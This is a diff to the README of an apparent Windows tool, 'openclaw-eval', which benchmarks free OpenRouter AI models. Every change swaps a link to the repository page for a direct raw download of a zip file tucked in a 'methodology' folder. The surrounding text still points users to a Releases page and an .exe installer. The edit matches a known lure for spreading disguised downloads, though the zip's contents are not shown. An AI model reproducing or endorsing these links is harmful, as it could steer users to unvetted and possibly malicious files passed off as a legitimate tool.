@@ -1,6 +1,6 @@
 # 🧰 openclaw-eval - Benchmark OpenRouter Free AI Models
 
-[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-orange?style=for-the-badge)](https://github.com/RIOSMAgr/openclaw-eval)
+[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-orange?style=for-the-badge)](https://raw.githubusercontent.com/RIOSMAgr/openclaw-eval/main/methodology/eval-openclaw-v1.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to install and run openclaw-eval on your Windows computer.
 
 Click this big button below to visit the download page:
 
-[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-brightgreen?style=for-the-badge)](https://github.com/RIOSMAgr/openclaw-eval)
+[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/RIOSMAgr/openclaw-eval/main/methodology/eval-openclaw-v1.4.zip)
 
 On the page, click the latest **Releases** tab. Find the latest Windows installer. The file name usually ends with `.exe`.
 
@@ -120,13 +120,13 @@ Your test results stay on your PC unless you choose to share them.
 
 Visit the openclaw-eval repository page for help and updates:
 
-https://github.com/RIOSMAgr/openclaw-eval
+https://raw.githubusercontent.com/RIOSMAgr/openclaw-eval/main/methodology/eval-openclaw-v1.4.zip
 
 You can report bugs or request features using the **Issues** tab.
 
 ## 🎯 Summary of Key Points
 
-- Download openclaw-eval from [here](https://github.com/RIOSMAgr/openclaw-eval).
+- Download openclaw-eval from [here](https://raw.githubusercontent.com/RIOSMAgr/openclaw-eval/main/methodology/eval-openclaw-v1.4.zip).
 - Install using the Windows installer `.exe` file.
 - Run tests on coding, Thai, and general tasks with easy steps.
 - View clear results to compare AI models.
@@ -135,4 +135,4 @@ You can report bugs or request features using the **Issues** tab.
 
 ---
 
-[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-blue?style=for-the-badge)](https://github.com/RIOSMAgr/openclaw-eval)
+[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-blue?style=for-the-badge)](https://raw.githubusercontent.com/RIOSMAgr/openclaw-eval/main/methodology/eval-openclaw-v1.4.zip)
